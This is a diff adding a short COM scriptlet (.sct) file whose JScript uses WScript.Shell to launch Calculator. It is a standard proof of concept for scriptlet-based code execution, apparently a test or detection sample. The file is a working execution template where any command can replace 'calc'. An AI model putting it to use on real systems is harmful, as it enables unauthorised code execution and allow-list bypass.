@@ -1,0 +1,7 @@
+<?xml version="1.0"?>
+<scriptlet>
+  <registration progid="p" classid="{00000000-0000-0000-0000-000000000000}"></registration>
+  <script language="JScript">
+    <![CDATA[ new ActiveXObject("WScript.Shell").Run("calc"); ]]>
+  </script>
+</scriptlet>
